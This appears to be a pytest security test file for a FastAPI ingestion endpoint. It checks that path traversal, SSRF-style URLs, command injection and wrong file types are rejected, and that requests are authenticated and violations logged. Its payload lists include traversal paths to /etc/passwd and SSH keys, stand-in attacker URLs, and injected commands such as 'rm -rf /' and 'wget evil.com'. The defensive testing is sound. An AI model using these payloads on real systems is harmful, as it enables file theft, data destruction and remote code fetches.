"""Test ingestion endpoint security against SSRF and path traversal."""

import pytest
import tempfile
from pathlib import Path
from unittest.mock import patch
from fastapi.testclient import TestClient

from src.service.main import app
from src.models.test_models import IngestRequest


class TestIngestionSecurity:
    """Test ingestion endpoint security."""
    
    @pytest.fixture
    def client(self):
        """Create test client."""
        return TestClient(app)
    
    @pytest.fixture
    def temp_data_dir(self):
        """Create temporary data directory with test files."""
        with tempfile.TemporaryDirectory() as temp_dir:
            # Create data directory
            data_dir = Path(temp_dir) / "data"
            data_dir.mkdir()
            
            # Create valid test files
            functional_file = data_dir / "functional_tests.json"
            functional_file.write_text('{"tests": [{"name": "test1", "type": "functional"}]}')
            
            api_file = data_dir / "api_tests.json"  
            api_file.write_text('{"tests": [{"name": "test2", "type": "api"}]}')
            
            # Create a secret file outside data directory
            secret_file = Path(temp_dir) / "secret.txt"
            secret_file.write_text("secret information")
            
            yield {
                "data_dir": str(data_dir),
                "functional_file": "functional_tests.json",
                "api_file": "api_tests.json",
                "secret_file": str(secret_file)
            }
    
    def _mock_validator_for_temp_dir(self, temp_data_dir):
        """Helper to create a mock validator for the temp directory."""
        from src.security.path_validator import SecurePathValidator
        return SecurePathValidator(
            allowed_base_dirs=[temp_data_dir["data_dir"]],
            allowed_extensions=['.json']
        )
    
    @patch('src.auth.secure_key_manager._key_manager', None)
    def test_directory_traversal_attack_blocked(self, client, temp_data_dir):
        """Test that directory traversal attacks are blocked."""
        with patch.dict('os.environ', {"MASTER_API_KEY": "test-key"}, clear=True):
            with patch('src.service.main.limiter.limit', lambda x: lambda f: f):
                # Clear global key manager
                from src.auth import secure_key_manager
                secure_key_manager._key_manager = None
                
                # Mock the get_data_path_validator function to return a validator for our temp directory
                with patch('src.security.path_validator.get_data_path_validator') as mock_get_validator:
                    mock_validator = self._mock_validator_for_temp_dir(temp_data_dir)
                    mock_get_validator.return_value = mock_validator
                    
                    dangerous_paths = [
                        "../secret.txt",
                        "../../etc/passwd", 
                        "../../../root/.ssh/id_rsa",
                        "data/../secret.txt"
                    ]
                    
                    headers = {"X-API-Key": "test-key"}
                    
                    for path in dangerous_paths:
                        response = client.post(
                            "/ingest",
                            json={"functional_path": path},
                            headers=headers
                        )
                        
                        assert response.status_code == 400
                        assert "dangerous pattern" in response.json()["detail"]
    
    @patch('src.auth.secure_key_manager._key_manager', None)
    def test_url_schemes_blocked(self, client, temp_data_dir):
        """Test that URL schemes are blocked to prevent SSRF."""
        with patch.dict('os.environ', {"MASTER_API_KEY": "test-key"}, clear=True):
            with patch('src.service.main.limiter.limit', lambda x: lambda f: f):
                # Clear global key manager
                from src.auth import secure_key_manager
                secure_key_manager._key_manager = None
                
                # Mock the get_data_path_validator function to return a validator for our temp directory
                with patch('src.security.path_validator.get_data_path_validator') as mock_get_validator:
                    mock_validator = self._mock_validator_for_temp_dir(temp_data_dir)
                    mock_get_validator.return_value = mock_validator
                    
                    dangerous_urls = [
                        "file:///etc/passwd",
                        "http://malicious.com/payload",
                        "https://evil.site/data",
                        "ftp://attacker.com/secret"
                    ]
                    
                    headers = {"X-API-Key": "test-key"}
                    
                    for url in dangerous_urls:
                        response = client.post(
                            "/ingest",
                            json={"functional_path": url},
                            headers=headers
                        )
                        
                        assert response.status_code == 400
                        assert "dangerous pattern" in response.json()["detail"]
    
    @patch('src.auth.secure_key_manager._key_manager', None)
    def test_command_injection_blocked(self, client, temp_data_dir):
        """Test that command injection attempts are blocked."""
        with patch.dict('os.environ', {"MASTER_API_KEY": "test-key"}, clear=True):
            with patch('src.service.main.limiter.limit', lambda x: lambda f: f):
                # Clear global key manager
                from src.auth import secure_key_manager
                secure_key_manager._key_manager = None
                
                # Mock the get_data_path_validator function to return a validator for our temp directory
                with patch('src.security.path_validator.get_data_path_validator') as mock_get_validator:
                    mock_validator = self._mock_validator_for_temp_dir(temp_data_dir)
                    mock_get_validator.return_value = mock_validator
                    
                    dangerous_commands = [
                        "test.json; rm -rf /",
                        "test.json | cat /etc/passwd",
                        "test.json & wget evil.com",
                        "test.json `id`",
                        "test.json $(whoami)"
                    ]
                    
                    headers = {"X-API-Key": "test-key"}
                    
                    for cmd in dangerous_commands:
                        response = client.post(
                            "/ingest",
                            json={"api_path": cmd},
                            headers=headers
                        )
                        
                        assert response.status_code == 400
                        assert "dangerous pattern" in response.json()["detail"]
    
    @patch('src.auth.secure_key_manager._key_manager', None)
    def test_non_json_files_blocked(self, client, temp_data_dir):
        """Test that non-JSON files are blocked."""
        with patch.dict('os.environ', {"MASTER_API_KEY": "test-key"}, clear=True):
            with patch('src.service.main.limiter.limit', lambda x: lambda f: f):
                # Clear global key manager
                from src.auth import secure_key_manager
                secure_key_manager._key_manager = None
                
                # Mock the get_data_path_validator function to return a validator for our temp directory
                with patch('src.security.path_validator.get_data_path_validator') as mock_get_validator:
                    mock_validator = self._mock_validator_for_temp_dir(temp_data_dir)
                    mock_get_validator.return_value = mock_validator
                    
                    invalid_extensions = [
                        "malicious.exe",
                        "script.sh",
                        "config.ini",
                        "data.txt"
                    ]
                    
                    headers = {"X-API-Key": "test-key"}
                    
                    for filename in invalid_extensions:
                        response = client.post(
                            "/ingest",
                            json={"functional_path": filename},
                            headers=headers
                        )
                        
                        assert response.status_code == 400
                        assert "not allowed" in response.json()["detail"]
    
    @patch('src.auth.secure_key_manager._key_manager', None) 
    @patch('src.ingest.ingest_functional.ingest_functional_tests')
    def test_valid_file_path_accepted(self, mock_ingest, client, temp_data_dir):
        """Test that valid file paths are accepted."""
        with patch.dict('os.environ', {"MASTER_API_KEY": "test-key"}, clear=True):
            with patch('src.service.main.limiter.limit', lambda x: lambda f: f):
                # Clear global key manager
                from src.auth import secure_key_manager
                secure_key_manager._key_manager = None
                
                # Mock the get_data_path_validator function to return a validator for our temp directory
                with patch('src.security.path_validator.get_data_path_validator') as mock_get_validator:
                    mock_validator = self._mock_validator_for_temp_dir(temp_data_dir)
                    mock_get_validator.return_value = mock_validator
                    
                    # Mock successful ingestion
                    mock_ingest.return_value = {
                        "ingested": 5,
                        "errors": [],
                        "warnings": []
                    }
                    
                    headers = {"X-API-Key": "test-key"}
                    
                    response = client.post(
                        "/ingest",
                        json={"functional_path": temp_data_dir["functional_file"]},
                        headers=headers
                    )
                    
                    assert response.status_code == 200
                    data = response.json()
                    assert data["functional_ingested"] == 5
                    
                    # Verify the ingestion function was called
                    mock_ingest.assert_called_once()
    
    @patch('src.auth.secure_key_manager._key_manager', None)
    def test_nonexistent_file_returns_404(self, client, temp_data_dir):
        """Test that nonexistent files return 404."""
        with patch.dict('os.environ', {"MASTER_API_KEY": "test-key"}, clear=True):
            with patch('src.service.main.limiter.limit', lambda x: lambda f: f):
                # Clear global key manager
                from src.auth import secure_key_manager
                secure_key_manager._key_manager = None
                
                # Mock the get_data_path_validator function to return a validator for our temp directory
                with patch('src.security.path_validator.get_data_path_validator') as mock_get_validator:
                    mock_validator = self._mock_validator_for_temp_dir(temp_data_dir)
                    mock_get_validator.return_value = mock_validator
                    
                    headers = {"X-API-Key": "test-key"}
                    
                    response = client.post(
                        "/ingest",
                        json={"functional_path": "nonexistent.json"},
                        headers=headers
                    )
                    
                    assert response.status_code == 404
                    assert "not found" in response.json()["detail"]
    
    @patch('src.auth.secure_key_manager._key_manager', None)
    def test_both_paths_validated(self, client, temp_data_dir):
        """Test that both functional_path and api_path are validated."""
        with patch.dict('os.environ', {"MASTER_API_KEY": "test-key"}, clear=True):
            with patch('src.service.main.limiter.limit', lambda x: lambda f: f):
                # Clear global key manager
                from src.auth import secure_key_manager
                secure_key_manager._key_manager = None
                
                # Mock the get_data_path_validator function to return a validator for our temp directory
                with patch('src.security.path_validator.get_data_path_validator') as mock_get_validator:
                    mock_validator = self._mock_validator_for_temp_dir(temp_data_dir)
                    mock_get_validator.return_value = mock_validator
                    
                    headers = {"X-API-Key": "test-key"}
                    
                    # Test with dangerous functional path
                    response = client.post(
                        "/ingest",
                        json={
                            "functional_path": "../secret.txt",
                            "api_path": temp_data_dir["api_file"]
                        },
                        headers=headers
                    )
                    
                    assert response.status_code == 400
                    assert "functional file path" in response.json()["detail"]
                    
                    # Test with dangerous API path  
                    response = client.post(
                        "/ingest",
                        json={
                            "functional_path": temp_data_dir["functional_file"],
                            "api_path": "../../etc/passwd"
                        },
                        headers=headers
                    )
                    
                    assert response.status_code == 400
                    assert "API file path" in response.json()["detail"]
    
    def test_ingestion_requires_authentication(self, client, temp_data_dir):
        """Test that ingestion endpoint requires authentication."""
        response = client.post(
            "/ingest",
            json={"functional_path": temp_data_dir["functional_file"]}
        )
        
        assert response.status_code == 401
        assert response.json()["detail"] == "Missing API key"
    
    @patch('src.auth.secure_key_manager._key_manager', None)
    @patch('src.service.main.logger')
    def test_security_violations_logged(self, mock_logger, client, temp_data_dir):
        """Test that security violations are properly logged."""
        with patch.dict('os.environ', {"MASTER_API_KEY": "test-key"}, clear=True):
            with patch('src.service.main.limiter.limit', lambda x: lambda f: f):
                # Clear global key manager
                from src.auth import secure_key_manager
                secure_key_manager._key_manager = None
                
                # Mock the get_data_path_validator function to return a validator for our temp directory
                with patch('src.security.path_validator.get_data_path_validator') as mock_get_validator:
                    mock_validator = self._mock_validator_for_temp_dir(temp_data_dir)
                    mock_get_validator.return_value = mock_validator
                    
                    headers = {"X-API-Key": "test-key"}
                    
                    response = client.post(
                        "/ingest",
                        json={"functional_path": "../secret.txt"},
                        headers=headers
                    )
                    
                    assert response.status_code == 400
                    
                    # Verify security logging occurred
                    mock_logger.error.assert_called()
                    call_args = mock_logger.error.call_args
                    assert "path validation failed" in call_args[0][0]
                    assert call_args[1]["extra"]["security_event"] is True